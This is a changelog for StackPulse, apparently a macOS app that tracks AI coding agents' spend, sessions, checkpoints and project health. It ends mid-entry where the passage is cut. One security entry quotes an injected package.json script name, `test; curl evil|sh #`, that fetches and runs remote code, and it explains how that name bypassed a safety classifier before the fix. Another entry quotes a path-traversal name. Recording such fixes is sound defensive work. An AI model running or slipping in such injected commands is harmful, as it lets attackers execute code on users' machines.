# Changelog

All notable changes to StackPulse are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

Note that StackPulse tracks **four independent version lines** — the app, the
core, the protocol, and (later) a compatibility manifest — as described in
[ADR-0006](docs/decisions/0006-independent-version-lines.md). Entries below note
which line changed. Protocol- and core-level changes that affect other repos are
also recorded in [`docs/CROSS_REPO_CHANGELOG.md`](docs/CROSS_REPO_CHANGELOG.md).

## [Unreleased] — Phase 0 foundation

First working foundation. Everything below is proven against real Claude Code and
Codex CLI logs on macOS (Apple Silicon).

Version lines at this point: **core 0.1.0**, **protocol 1.0.0**, app pre-release.

### Phase 4/6 wave + the pricing correction (app 0.26.0 / protocol 1.18.0)

**Your Claude spend estimate was 2.75× too high.** `rates_for` matched model
families by substring, so *anything* containing `opus` got the Opus rate card —
which still held Opus **4.1**'s prices. Opus 4.8 costs $5/$25 per MTok; it was
being billed at $15/$75. On this machine that turned a real ~$13,181 30-day
estimate into **$36,207**, and nothing disclosed it, because a wrong rate looks
exactly like a right one — it produces no note, no error, no signal at all.

Rates are now read from Anthropic's published price list and **pinned by tests**
(nothing previously asserted a rate card matched reality — the tests only checked
`is_some()`). `rates_for` parses the model VERSION instead of the family name, and
an unrecognized version of a known family is now **unpriced rather than given a
sibling's price**: "we don't know" is a fact a canary can report; a confidently
wrong number is not. Also added Fable 5 / Mythos 5 (real rates), Opus 4/4.1 as a
distinct legacy card, Sonnet 5's introductory rate, and Haiku 3.5.

**Schema canaries** (protocol 1.18.0: `SchemaCanary` / `CanaryStatus` /
`UnpricedModel` + `UsageSnapshot.canaries`, new Usage → **Data Checks** tab). The
app reads logs whose format it does not control, so drift is silent. The canary
says "your numbers are incomplete, here's exactly how" instead of quietly
understating. `no_data` is never rendered as `ok` — nothing to verify is not a
pass.

**Known inaccuracies are now stated in `pricing.rs` rather than hidden:** cache
writes are priced at the 5-minute rate though 86% of real writes are 1-hour
(bills at 2× input — so this *understates*); the OpenAI/Codex rate cards are
unverified; Sonnet 5's introductory rate silently expires 2026-08-31.

**`Checkpoint.files_unknown`** (1.18.0) — `files: []` meant both "captured
nothing" and "git wouldn't say". A file list git refused to produce is now
unknown, not empty.

**Also:** a **Security & Privacy** panel in Settings built from live runtime state
(every row sourced from a real symbol, no secret ever rendered); a cross-project
**update-intelligence digest** in Stack Health, which also fixed a real bug —
enrichment is keyed by `ecosystem+name`, so one shared status verdict was wrong
for 23.8% of (project, dependency) pairs at different versions; **public docs**
(README + `docs/USAGE.md`).

**Accessibility:** `GlassButtonStyle` never honored Reduce Transparency, making
Settings' "glass surfaces fall back to solid fills" **false for all 71 button call
sites** — fixed. Escape now dismisses the four destructive confirm dialogs (it
previously had no keyboard exit); Return still deliberately does NOT confirm them.
The menu-bar popover's five icon-only buttons have accessibility labels.

**Docs that contradicted the code, corrected:** `SECURITY_BOUNDARIES.md` claimed
"network-free", "executes no external commands", and "never reads secret values"
— all three false since v0.1.0. The protocol claimed `get_stack_health` may
contact registries; the core ignores the flag entirely. `Info.plist` reported
version **0.1.0** while the app was 0.25.0 — Settings now reads the bundle, so the
two can't drift again.

### Bug sweep round 3 (app 0.25.0 / protocol 1.17.0)

Same rule as rounds 1–2: nothing was fixed before it was reproduced. Three claims
from the backlog turned out to be **false or overstated**, and are recorded as
such rather than quietly "fixed".

**Filenames the app reported that did not exist.** `git status --porcelain`
quotes any path containing a space, so a file named `a -> b.txt` arrives as
`"a -> b.txt"`. Splitting on the ` -> ` rename separator *before* reading the
quotes reported `b.txt"` — trailing quote and all. Non-ASCII was worse: git
escapes `é` as the literal text `\303\251`, and stripping quotes surfaced that raw
escape as the filename. Both verified against real git output, then fixed in one
shared `gitpath` decoder (the three hand-rolled copies each got a different subset
wrong). `stash show --name-only` disagrees with `status --porcelain` about
quoting spaces, so checkpoints had its own variant of the bug.

**One odd character blanked every provider.** `parse_iso_unix` sliced at byte 8 of
the time field, which is only proven ASCII at bytes 2 and 5 — a multi-byte
character straddling it panicked. The FFI catches panics, so a single malformed
timestamp in a single log line turned the whole snapshot into an error: every
provider blank. The module's own doc promised "we never panic".

**Claude usage was under-counted.** The scanner claimed a record's dedup key
before validating its timestamp, so a rejected record permanently blocked a later
valid one with the same key. Codex shares the shape but not the bug — its key is
derived from the timestamp, so a collision implies the same verdict.

**Live limits: one payload, two scales.** `utilization` may be a percent (0–100)
or a fraction (0–1) — `0.8` is 80% under one reading and 0.8% under the other. The
scale was decided per *value* (`v <= 1 ? v * 100 : v`), so `{ seven_day: 12.5,
five_hour: 0.45 }` reported weekly 12.5% **and** 5h 45%, reading one body as both
scales at once. It is now decided per payload: a value above 1.0 proves the
payload is a percent. The genuinely ambiguous case (every window ≤ 1.0) is exactly
the state just after a reset, so the verdict is remembered once the endpoint proves
it — otherwise 0.82% would display as 82% and fire a fake "nearly out" alert.

**A scope guard that under-reported scope** (protocol 1.17.0, `ScopeFlag.match_count`).
The core caps a flag's file list at 8 and the true count wasn't on the wire, so the
UI counted the sample: a session touching 40 auth files announced "Security / auth
code · 8". Found by chasing a doc comment that claimed a total the code never
carried.

**"No checkpoints" when git had actually failed**, and **"0 outdated" for
dependencies nobody had checked yet** — two more cases of absence rendered as a
confident zero.

Also: a user-cancelled run could persist as "Test failed"; `DailyBarChart` and the
Trends chart each rescanned their whole series once per bar (8,100 → 90 calls at
90d); Stack Health made 11 passes per project per render; and Launch now says on
its face when it will install dependencies first.

**Not real, and left alone:** the `MissionCard` rescan is structurally real but
costs ~6 comparisons every 120s, not the claimed N×100 — no measurable win, so no
performance claim is made for it. `DateFormatter` was not allocated per bar (only
mutated). The `normalizePercent` fraction/percent ambiguity could not be resolved
from local data alone; the residual all-≤1.0 case is documented, not guessed at.

### Bug sweep rounds 1-2 (app 0.23.0-0.24.0 / protocol 1.16.0)

Four adversarial reviewers swept performance, Swift correctness, Rust robustness
and security. Every finding was reproduced before it was fixed.

**Security**
- **A hostile `package.json` could run a command with no confirmation.** A script
  named `test; curl evil|sh #` became `npm run test; curl evil|sh #`, which the
  safety classifier read as **read_only** (it sees the token "test") and labelled
  **"Test"** — so it landed on the prominent Test Project button and bypassed the
  confirmation dialog entirely. The Makefile/justfile/Taskfile parsers all validate
  their keys; the package.json loop didn't. Now whitelisted.

**Performance**
- **Every refresh scanned your logs twice.** `record_history` builds its own
  snapshot, so calling it after `get_usage_snapshot` re-read gigabytes a second
  time, every 2 minutes. Protocol 1.16.0 lets the snapshot op record history from
  the snapshot it already has — one scan.
- Run console no longer rebuilds up to 2,000 selectable text views on every output
  chunk (it stuttered exactly while output streamed). Stack Health no longer
  re-fetches ~1,000 npm/crates requests on every Advisor tab switch. Discover no
  longer re-runs the whole radar on every visit. The Keychain probe moved off the
  main thread.

**Things the app was saying that weren't true**
- **Expired limit windows were reported as current — on Claude *and* Codex.** A
  window past its reset isn't stale, it's wrong (usage restarts at zero). Claude
  replayed a cached 5-hour window 3 days after it expired; Codex would replay one
  for weeks and raise a **false critical alert + notification** from it.
- **A severity escalation never notified.** Alert ids are stable across severity,
  so you'd be warned at 85% of budget and never told you blew it — and warned at
  80% of a limit but never at 96%. The gate now keys on severity too.
- **"Resets just now."** for a reset days away — a past-tense formatter used on a
  future date, in alerts and macOS notification bodies.
- **Discover could show a green "all clear, scanned 0 projects"** when the core had
  actually returned an *error*: the decoder defaulted every field, so an error
  payload decoded as an empty report.
- **Missions could show a green "verified" tick** from a run it couldn't place in
  time (unknown session start defaulted to "after"). Absence of evidence is now
  reported as absence.
- **A run you cancelled could be recorded as "Test failed"** — the stop intent lost
  a race with the SIGTERM reap.
- **The radar claimed generated folders weren't gitignored when git says they are**
  (`**/node_modules`, `dist/**` — mainstream globs a line-comparison missed). It
  now asks `git check-ignore`.
- **Linked worktrees and submodules were reported as having no git remote** — their
  `.git` is a *file*, not a directory, so we bailed. StackPulse creates linked
  worktrees itself, so this was self-inflicted.

180 tests passing (workspace), 0 clippy warnings, fmt clean.

### Fix: launching Terminal froze the app for ~20 seconds (app 0.22.2)

- **The bug you hit.** Every "Launch", "Run in Terminal", "Restore" and worktree
  action drove Terminal via `NSAppleScript.executeAndReturnError` — which is fully
  synchronous — **on the main thread**. So the UI was blocked while Terminal cold-
  launched and the Apple Event round-tripped, and (on first use) for as long as the
  macOS Automation permission dialog sat on screen. That's the slowness and the
  glitching.
- **Measured, not guessed:** the old path blocked the calling thread for
  **20,677 ms**. The fix dispatches the AppleScript to a dedicated **serial**
  background queue (serial because `NSAppleScript` is not thread-safe), and the
  call now returns in **0.0 ms** — Terminal still opens exactly as before, the UI
  just never waits for it.
- `runInTerminal` no longer returns a `Bool`; it can't know synchronously anymore,
  and every call site already discarded it.

### Protocol contract tests (app 0.22.1)

Phase 6 groundwork. `stackpulse-protocol` is the one thing a future Windows client
and the Chrome native-messaging host both compile against — and nothing pinned the
actual bytes on the wire. A rename or a dropped `#[serde(default)]` would still
compile, and this app (which serializes *and* deserializes with the same code)
would never notice; only the downstream consumer would break.

- **11 contract tests** now encode what `docs/PROTOCOL.md` promises: every `op` and
  `kind` tag string is pinned, newtype responses must stay *flattened* next to
  `kind` (nesting would break every Swift decoder at once), unknown enum values must
  fall back to their catch-all, unknown keys must be ignored, additive fields must
  stay optional, and enums must stay `snake_case`.
- They assert on **literal JSON**, not round-trips through our own types — a
  round-trip passes even if every field were renamed, which is exactly the break
  worth catching.
- **The docs are part of the contract:** a test fails if `PROTOCOL_VERSION` and
  `docs/PROTOCOL.md` drift, or if an op exists in code but is undocumented. That
  second one immediately caught six ops missing from the doc's tables — now added.
- **Proven, not assumed:** I mutation-tested the guards — bumping the version
  without updating the doc, and renaming an op tag — and confirmed each fails with
  its intended message.
- Workspace: **177 tests passing**, 0 clippy warnings, fmt clean.

### Worktrees — isolated agent runs (app 0.22.0 / protocol 1.15.0)

The last substantive Phase-5 capability: give an agent its own copy of the repo so
your main checkout is never in the blast radius.

- **New isolated copy.** Every git project in Projects gets a **Worktrees** panel:
  name it, and StackPulse runs `git worktree add` to create a second working
  directory on its own `stackpulse/<name>` branch. Then Open in Terminal and point
  an agent at it. Creating is **additive** — it adds a directory and a branch and
  leaves your working tree, index, HEAD, and current branch untouched (verified
  byte-for-byte, with modified/staged/untracked work in flight).
- **Removing is gated, and the core refuses to own it.** Removal deletes a
  directory, so the core only *reports* the command; the app runs it visibly in
  Terminal behind a confirmation that names the path and warns uncommitted work in
  it is gone. The **main checkout can never be removed** (no command is offered).
- **Copies live outside your projects.** They're created under
  `~/Library/Application Support/StackPulse/worktrees`, not next to your repos —
  otherwise the project scan would surface each one as a bogus new project in
  Projects and the Launcher.
- **Names are sanitized before they touch a path or a git ref** — `"../../evil
  name!"` becomes the branch `stackpulse/evil-name` in a directory safely inside
  the worktrees folder, and is additionally gated through `git check-ref-format`.
  An existing name is refused with an honest note rather than clobbering anything.
- **149 core tests** (18 new, incl. the main-tree-untouched safety test and name
  sanitization), clippy/fmt clean. Also fixed a duplicated `#[test]` attribute I'd
  introduced in the previous change.

### Fix: missions showed a meaningless "HEAD" branch (app 0.21.1)

- **Every mission claimed it was on a branch called `HEAD`.** Claude's session logs
  record `gitBranch` as the literal string `"HEAD"` (verified: 3,237 occurrences
  across recent sessions, and not one real branch name). `HEAD` is what git prints
  for a *detached* HEAD — it is not a branch anyone is on — so we were rendering
  noise on every mission card and writing it into handoff packages.
- **Now:** `HEAD` / `(no branch)` are rejected as branch names, and the branch is
  read live from git for the mission's project instead. That's deliberately
  consistent with `changed_files`, which is already read live from the same working
  tree — both describe the project *now*.
- **Codex missions get a branch for the first time** (their logs never carried one,
  so the field was always empty).
- Verified on real sessions: `stackpulse-mac` and `zeder-erp` now correctly report
  **`main`**, and sessions started in the non-repo umbrella folder correctly report
  **no branch** instead of "HEAD". 132 core tests (3 new), clippy/fmt clean.

### Evidence-based completion + handoff packages (app 0.21.0)

Two more Phase-5 capabilities, both composed from data StackPulse already holds —
no new scanning, no protocol change.

- **Did anyone actually check this?** A mission that changed files now shows its
  **verification**: the latest captured test/check run for that project, with its
  outcome and age. Crucially, when there's no evidence it says so —
  *"Not verified — no test run captured for this project since these changes"* —
  because an agent going quiet is **not** evidence the work is good. A passing run
  from *before* the session started is also called out as not evidence for these
  changes, rather than quietly counted as a pass.
- **Cross-agent handoff packages.** Every mission gets **Handoff** (copy) and
  **Save…** — a Markdown package describing what the session touched (changed
  files), what that risks (scope flags), what it was last doing (latest turn),
  whether anything verified it, and how to get back (the latest checkpoint + its
  restore command). Hand it to another agent, or to yourself next week.
- The package omits sections rather than padding them, so a reader can tell
  "nothing changed" from "we don't know" — and it never claims work is verified
  when it isn't.

Swift-only; build clean.

### Spend budgets — Phase 5 guardrails (app 0.20.0)

- **Set a budget, get warned before it hurts.** Settings → **Spend budget** takes a
  **daily** and/or **30-day** limit in USD (leave empty for none) and a warn
  threshold (default 80%; 100% always raises a critical). Crossing one raises a
  real **needs-attention alert** — so it flows into the toolbar bell, the sidebar,
  and native notifications like any other alert, with no new plumbing.
- **Home shows the meter.** Once a budget is set, Home shows today's / 30-day spend
  against it with a percentage — no budget, no nag.
- **Honest about what it is and isn't.** The figures are local list-price
  estimates, not a bill; and StackPulse **only warns — it can't stop a running
  agent** (it doesn't control your tools). The UI says exactly that rather than
  implying a hard stop.
- Empty ≠ zero: an empty budget field means "no budget", not "$0 — everything is
  over budget", and half-typed numbers only commit on Return/blur so a stray
  keystroke can't fire an alert.
- Evaluated client-side alongside the existing synthesized live-limit alerts,
  rather than in the core: a budget is a user preference and the check is
  "total vs threshold" — not the shared parsing/pricing logic the core owns — and
  it keeps `Alert.provider` honest (a budget spans providers). Swift-only.

### Checkpoints — Phase 5 safe automation (app 0.19.0 / protocol 1.14.0)

Makes "let an agent loose on my repo" a reversible decision — without the safety
net itself being risky.

- **Snapshot now.** Every git project in Projects gets a **Checkpoints** panel:
  capture your uncommitted work before an agent run, see past snapshots (label,
  short SHA, branch, captured files, age), and get back if it goes wrong.
- **Capturing is non-destructive, by construction.** It uses `git stash create`,
  which writes a commit object **without touching the working tree, the index, or
  HEAD** — unlike `git stash push`, it rolls nothing back, so it's safe to run
  while an agent is mid-edit. The object is kept alive under
  `refs/stackpulse/checkpoints/*`; checkpoints never appear as branches or tags.
  Verified: working tree, file contents and HEAD are byte-identical after a
  capture, and your stash list is never touched.
- **Restoring is the only mutating step, and the core refuses to own it.** The
  core only *reports* the exact `restore_command`; the app runs it **visibly in
  Terminal** behind an explicit confirmation that names the files, project, SHA
  and age. You can also just copy the command.
- **It tells you what it did *not* capture.** `git stash create` snapshots tracked
  work only, so a checkpoint taken with untracked files present now says so
  ("does not include N untracked file(s) — `git add` anything new you'd want
  back") instead of letting you trust an incomplete safety net. Clean trees,
  untracked-only trees, repos with no commits, and non-repos each get their own
  honest note rather than a fabricated empty checkpoint.
- **129 core tests** (17 new, incl. a test pinning that the working tree is
  untouched and that exclusions are disclosed), clippy/fmt clean.

### App icon fix + menu clarity (app 0.18.0)

- **Icon now fills its tile.** The `.icns` artwork was a squircle inset inside the
  1024 canvas with transparent margins (the pre-Tahoe convention). macOS 26
  composites such legacy icons onto its **own light backing tile** and shrinks
  them — the white frame you saw in the Dock. The icon is now rebuilt **full-bleed
  and fully opaque**, so the system masks *our* art as the tile. Verified by
  rendering `NSWorkspace.icon(forFile:)` for the packaged app before and after.
- **"Projects" meant two things.** It named both a primary section (folder
  management) and an Advisor sub-tab (the repository radar). The Advisor tab is now
  **Repo Health**, so a label means one thing wherever you read it.
- **Related menus sit together.** Sidebar order is now Home · Launcher · Projects ·
  Missions · Usage · Advisor — Launcher and Projects are adjacent because they're
  two views of the same thing (run it vs. manage it).

### Project usage attribution + first-run onboarding (app 0.17.0 / protocol 1.13.0)

Closes the Phase 3 "project/task usage" gap and the last Phase 1 gap (onboarding).

- **Where your AI spend actually goes.** A new **By Project** tab under Usage
  attributes local spend to the project each session ran in, by grouping session
  records on the working directory recorded in the logs. Ranked by 30-day cost
  with a share-of-spend bar, today/30-day cost + tokens, turns, last activity, and
  provider chips. Costs remain local list-price estimates, never billed amounts.
  Protocol 1.13.0 adds `ProjectUsage` + the `get_project_usage` op; the engine
  (`project_usage.rs`) is offline and reuses the logs the provider scan reads.
  **Claude and Codex both attributed** (Codex verified against all 87 real session
  files first — every one records exactly one working directory).
  **Reconciled: 100% of scanned spend is attributed** (project totals match the
  provider scan to the record, modulo turns written mid-scan).
  **Umbrella folders are labelled honestly** — a watched *parent* folder that
  collects sessions started outside any repo says so on its card, instead of
  masquerading as a single project that ate the budget.
- **First-run onboarding.** A short, skippable welcome: what StackPulse is and the
  trust story (everything read locally, nothing uploaded; costs are estimates),
  add your project folders (single project *or* a parent folder), a one-line tour
  of the six sections, and the shortcuts. Replayable from **Settings → Welcome
  tour → Show again**.
- **112 core tests** (9 new), clippy/fmt clean; integrated Swift build clean.

### Sidebar Copy command + favorites + filter (app 0.16.0)

- **Copy the one-paste command from the sidebar.** Each app row in the sidebar
  Apps tab now has a **Copy** button that copies the whole launch recipe (cd +
  install-if-needed + start) — the same easy one-liner as the main section, not
  the individual commands. Plus Launch (or Open when running).
- **Favorites (pin to top).** Tap the ⭐ on any app — in the sidebar or the
  Launcher — to pin it to the top. Favorites persist across launches.
- **Filter.** Both the sidebar Apps tab and the Launcher have a search field to
  filter apps by name, and a **Favorites-only** toggle. Handy with 20+ projects.

Swift-only; build clean.

### Projects performance + sidebar Apps tab (app 0.15.0)

Fixed the Projects scroll stutter with 20+ projects loaded, and added a mini
launcher to the edge sidebar.

- **Lazy + cached rendering.** The project list is now a lazy two-column grid, so
  only the visible cards (and their subviews) are ever built. The launch panel
  used to re-read `node_modules` and parse `package.json` on *every* render for
  *every* card — that's now resolved **once per project, off the main thread**,
  and cached. Filtering "is this launchable?" no longer touches the filesystem.
- **Tighter distribution.** Command lists are collapsed by default (a "N commands"
  toggle), so each card is short — a 20-project list is far more compact, and the
  grid uses two columns on wider windows. Launch + Test Project stay always-visible.
- **Sidebar Apps tab.** The edge sidebar's tabs are now **Cards / Live / Apps** —
  the new **Apps** tab lists every launchable project with one-tap **Launch** (or
  **Open** when it's already running), a mini Launcher without opening the window.

Swift-only; build clean.

### Launcher menu + easier folder adding (app 0.14.0)

- **New Launcher section.** A dedicated sidebar menu (🚀) that lists every web app
  StackPulse found in your folders as a big card with one-tap **Launch**, **Copy
  command**, and its Local + shareable Network URLs — a home base for getting a
  demo up. Projects stays for folder management, commands, runs, and stack health.
- **Obvious "Add Folder" button.** Projects and Launcher both now have a prominent
  **Add Folder…** button in the header (it was previously easy to miss).
- **Add a parent folder, get all its projects.** Clarified throughout that you can
  point StackPulse at a *single project or a parent folder containing several* —
  it scans inside and finds them all (this already worked; now it's said plainly,
  in the picker and the empty states).
- The launch panel was extracted into a shared component so Projects and Launcher
  render the exact same Launch / Copy / URLs UI. Swift-only; build clean.

### One-paste demo launch (app 0.13.0)

Made launching a demo app as easy as the "paste one block and it's up" flow: each
web project in Projects now has a single **Launch** button and a **Copy command**
that copies the *whole* recipe — no more copying commands line by line.

- **Copy command** puts one self-contained line on the clipboard:
  `cd '<path>' && <npm install — only if node_modules is missing> && <start with
  the host exposed>`. Paste it anywhere and the app comes up.
- **Launch** runs that same recipe in Terminal (so you see the dev server's own
  output) and opens the browser the moment the port is listening.
- **Shareable URL.** The panel shows the **Local** and **Network** addresses
  (e.g. `192.168.68.71:3100`) — the "temporary IP domain" you can open from your
  phone or another machine on the same Wi-Fi, because the recipe starts the server
  with `--host` / `-H 0.0.0.0` (framework-aware). Tap either to copy.
- **Correct ports.** The port is read from the actual `package.json` script (e.g.
  Praxis's `next dev --port 3100`), not guessed — so the URLs and browser-open are
  right even when the port isn't on the command line. Already-running apps show
  **Open Preview** instead. Swift-only; build clean.

### Command runs — captured outcomes & history (app 0.12.0)

Closes the Phase 1 "command history/outcomes" and Phase 3 "test/build evidence"
gaps — the day-to-day loop of *run a command, did it pass?* now lives in the app.

- **Run in StackPulse (captured).** Every command — and the **Test Project**
  button — can now run **inside** StackPulse with its output streamed live in a
  console sheet, then a clear **Passed / Failed** result with exit code and
  duration. "Run in Terminal" is still there (the terminal icon) for anything you
  want in a real shell. Same safety gate: non-read-only commands still confirm
  first; destructive ones stay extra-warned; a Stop button and a 15-minute
  timeout bound every run.
- **Recent runs.** Outcomes persist across launches (`command_runs.json`), shown
  as a "Recent runs" list in Projects — glance at the last few results, reopen the
  captured output, or re-run (re-running preserves the original safety class).
- Runs execute via `zsh -lc` in the command's directory (login-shell PATH/nvm),
  fully visible — never a hidden in-process execution. Swift-only; build clean.

### Navigation reorganization — 11 sections → 5 (app 0.11.0)

Applied *A Philosophy of Software Design* to the IA: the sidebar was 11 shallow
sections in a technical "Monitor vs Build" split, with the same facts (spend,
limits, recommendations) leaking across many of them. Reorganized around the
**five questions a user actually opens the app with**, each a deep section:

- **Home** — what's happening right now: today's spend + live limits, active AI
  sessions, and anything needing attention (absorbs Overview + live summaries).
- **Usage** — where tokens & money go: a sub-switcher over **Breakdown /
  Trends / Report** (merges the old Usage, Trends, and Reports rows).
- **Missions** — what your agents are doing (with Scope Guard).
- **Advisor** — everything you could improve, one place: **Efficiency /
  Projects / Dependencies** (merges Insights + Discover/Radar + Stack Health).
- **Projects** — your code and what's running: commands, live dev servers, and
  one-tap web preview (merges Services in).

Cross-cutting things stopped being peer rows: **Needs Attention** is now a
toolbar **bell + badge** with an inbox popover; **Reports** is a tab inside
Usage; **Integrations/Settings** stay in the Settings window. Each of the former
section views is unchanged and reused as a sub-pane (single owner of its own
rendering), and the Overview dashboard body was extracted (`OverviewDashboard`)
so Home and Overview share one definition. Swift-only; build clean.

### Scope Guard on missions (app 0.10.0 / protocol 1.12.0)

- **Missions now warn what *kind* of change a session is making.** A new
  **Scope** row on each mission card flags the risk categories among its changed
  files — **secrets/env, database migrations, security/auth code** (high),
  **dependencies, lockfiles, build/CI config** (notable), and **tests** — so you
  can glance at an autonomous session and notice "this touched `.env` and a
  migration" without reading the diff. Color is always paired with a label + icon.
- The first read-only slice of **Safe Automation (Phase 5)**: purely
  path-pattern classification of the `changed_files` the core already gathers —
  deterministic, offline, and honest (it says "these files were touched", never
  "a dependency was added"). Nothing is executed or mutated.
- Protocol 1.12.0 adds `ScopeFlag` / `ScopeFlagKind` / `ScopeSeverity` + the
  additive `Mission.scope_flags` field, computed locally in `scope_guard.rs`.
  **103 core tests** (fmt/clippy clean).

### Repository Radar / Discover (app 0.9.0 / protocol 1.11.0)

- **New Discover section (Repository Radar).** The core scans your approved
  project roots and emits **deterministic, explainable, project-grounded**
  recommendations — never a generic feed. Each card answers the spec's "must
  explain" questions: why it's relevant, **which projects** it affects, the
  **evidence**, **effort**, **risk**, and **whether no change is safer**. Rules
  (all from local facts — filesystem + `git`, no network): missing agent
  instructions (CLAUDE.md/AGENTS.md → agents re-discover the layout each
  session), generated folders not `.gitignore`d, no test command where the stack
  is testable, `.env.example` with no `.env`, stale projects with uncommitted
  work, git repos with no remote/backup, and TypeScript projects with no
  typecheck script. Cards aggregate across projects (with the affected list) to
  stay high-signal; a clean scan shows an honest "nothing to flag" state. Copy a
  single card or **Copy all** as text to paste into a task or an agent prompt.
- Protocol 1.11.0 adds `Recommendation` / `RadarCategory` / `RadarEffort` /
  `RadarRisk` / `RadarReport` + the `get_radar` op and `radar` response. The
  radar engine (`radar.rs`) is portable and offline; **89 → 97 core tests**.
- Verified against the real machine: 29 projects scanned → 6 grounded
  recommendations (e.g. 21 projects with no agent-instructions file, 5 idle
  projects holding uncommitted work), all with real project names + evidence.

### Web Preview + Sidebar tabs + dev-server control (app 0.8.0)

- **One-tap web preview from Projects.** Each web project gains a **Preview on
  Web** button: StackPulse infers the dev command (a discovered `dev`/`start`/
  `serve` command, else `<pm> dev`) and the localhost port (parsed from the
  command — `--port`/`-p`/`PORT=` — else the framework's default), runs it
  **visibly in Terminal**, then opens the browser the moment the port is actually
  listening (a Network-framework readiness poll, no blind delay). If a matching
  dev server is already running it becomes **Open Preview** and opens directly.
- **Sidebar tabs.** The edge sidebar now has a frosted **Cards / Live / Web**
  segmented control (persisted across launches): *Cards* is the rich per-provider
  list, *Live* is active coding sessions + anything needing attention, and *Web*
  lists locally-running dev servers with one-tap Open.
- **Stop a dev server (safe, confirmed).** The Services section can now stop a
  detected dev server — a confirmation dialog, then a graceful `SIGTERM` (never
  `SIGKILL`) so it frees its port cleanly. Read-only everywhere else; this is the
  only mutating action and it's always one explicit, targeted tap.
- Swift-only wave — no protocol or core change. Integrated build clean.

### Richer Missions + Reports (app 0.7.0 / protocol 1.10.0)

- **Missions now show what an agent actually did.** Each mission gains **changed
  files** (from `git status` of the session's project) and a **preview of the
  latest turn**, plus safe **quick actions** (Reveal in Finder, Copy). Protocol
  1.10.0 adds `Mission.changed_files` + `Mission.last_message_preview`, both
  computed locally (git + the existing session-tail read; no network).
- **New Reports section** — a shareable, composed report of your usage, cache
  efficiency, insights, active work, and per-project stack health, with export to
  **Markdown / CSV / JSON** and a copy-summary. Built from data already local; the
  main-window "Monitor" group gains a Reports entry.

### Settings is its own window; the main window is data-only (app 0.6.3 — app-only)

Full separation of configuration from data:
- **New dedicated Settings window** (⌘, or the gear) with two tabs: **Settings**
  (appearance, refresh, notifications, edge sidebar, live limits, power, provider
  connections/API keys, tools, About) and **Integrations** — all the
  configuration, in its own window like a standard macOS preferences window.
- **The main window is now purely dashboards** — Overview, Missions, Insights,
  Usage, Trends, Needs Attention, Projects, Stack Health, Services. **Settings and
  Integrations were removed from its sidebar.** A "Settings" gear sits in the
  sidebar footer (and ⌘,) to open the separate window.
- The popover gear and the ⌘, shortcut both open the Settings window.

### Settings holds only settings (app 0.6.2 — app-only)

Settings was showing live *data* that belongs in the dashboards. It now holds
only controls:

- Removed from Settings: **Last updated**, **UTC bucket**, the refresh **cadence
  read-out** (the control already shows it), and the live-limits **"Last checked"
  + status** (all shown on the Claude card / popover / sidebar).
- Reordered into **preferences & options** first (appearance, refresh, notifications,
  edge sidebar, live limits, power, provider connections), then **tools** (Command
  Center, export), then a clearly-separated **About** footer for the static
  reference the spec requires there (versions, cost methodology, accessibility).

### Navigation reorganized (app 0.6.1 — app-only)

The information (Overview, Missions, Insights, Usage, Trends…) all sat in one flat
list you reached via the Settings gear, with Settings lumped in among it. Now:

- **Main-window sidebar is grouped** — **Monitor** (Overview, Missions, Insights,
  Usage, Trends, Needs Attention), **Build** (Projects, Stack Health, Services),
  **Providers** (Integrations) — with **Settings pinned separately at the bottom**
  so it reads as app settings, not another dashboard.
- **The popover "Open" button lands on the Overview dashboard**, not wherever the
  window was last (often Settings). The gear still goes straight to Settings.
- **The edge sidebar ("side card") gained an "Open in app" launcher** — one tap
  jumps to Overview / Usage / Trends / Missions / Insights / Stack Health, so the
  useful views are one click away instead of buried.

### Stack Health + Services — Phase 4 begins (app 0.6.0 / protocol 1.9.0)

The app was heavy on *watching* (usage/analytics) and light on the spec's
differentiators. This starts closing that gap with two new main-window sections.

- **Stack Health** — "is each project's stack current, compatible, and secure?"
  The portable core parses your **npm + Cargo** manifests/lockfiles into an
  offline dependency inventory (installed versions); the macOS app then fetches
  **latest versions** from the npm/crates registries and **security advisories**
  from **OSV**, flagging what's outdated (minor vs. major) or vulnerable. Network
  lives in the app layer, not the core, so the core stays pure/portable.
- **Services** — "what's running right now?" The core detects local **dev servers
  by listening TCP port** (`lsof`) and matches them to your projects; the app
  lists them grouped by project with the port, kind, and an **Open** action.
- Protocol **1.9.0** (additive): `ProjectStack` / `Dependency` / `Advisory` /
  `DependencyStatus` / `AdvisorySeverity` / `StackSummary` + `get_stack_health`;
  `RunningService` + `get_services`.

### Richer edge sidebar, sidebar positioning, quick Settings, deeper Antigravity (app 0.5.0)

- **The edge sidebar is actually useful now.** It was a name + one percentage per
  provider; it now leads with a **totals strip** (today's spend + tokens, live
  session count, items-to-check), an **Active-now** block, needs-attention, and
  **rich per-provider rows** — tokens · turns · cache% for measured providers, or
  sessions · model for activity-only ones (Antigravity), plus the hottest limit
  meter.
- **Sidebar can pin left or right.** A **⇄ quick toggle** in the sidebar header
  flips the edge live, plus a Left/Right control in **Settings → Edge sidebar**.
  Persisted; the panel re-pins instantly.
- **Quick Settings from the menu bar.** The popover now has a clear **gear →
  Settings** button (Command Center moved after it, still one click / ⌘⇧C).
- **Deeper Antigravity.** Real **agent-step counts** per conversation, read from
  the SQLite trajectories via `rusqlite` scoped to the **macOS target only** (the
  portable-core Linux/Windows CI gates never pull a C toolchain; the DB is opened
  read-only and coexists safely with Antigravity writing it). Antigravity missions
  now show real activity (e.g. "464 steps") instead of "0 turns", and the card
  notes total agent steps.

### Claude live-limits: stale-token handling (app 0.4.1 — app-only)

- **Fixed the misleading "Sign in to Claude" message.** StackPulse reads Claude
  Code's saved OAuth token (and never refreshes it — refreshing could rotate the
  token and sign you *out* of Claude Code). When that saved token expires, the
  card used to say "Sign in to Claude Code," which reads as *signed out* even
  though you aren't. It now says the saved login has expired and will resume when
  Claude Code renews it. A genuine 401 (real re-auth needed) is worded distinctly.
- **The last-known % now survives.** Live limits are persisted to disk and shown
  with an honest **"as of …"** label when a fresh value can't be fetched (expired
  token, offline, rate-limited) — instead of the card blanking. The cache window
  extends to a few days since Claude's dominant window is weekly (slow-moving).

### Antigravity real-data scanner (app 0.4.0 — core behavior, no protocol change)

- **Antigravity now shows real local data** instead of a detection-only "no
  data" state. It's a Windsurf/Codeium-style agent IDE (talks to Gemini); the new
  `providers::antigravity` scanner reads `~/.gemini/antigravity/conversations/*.db`
  for **conversation count, recency, and the model** (`gemini-3-flash-agent`,
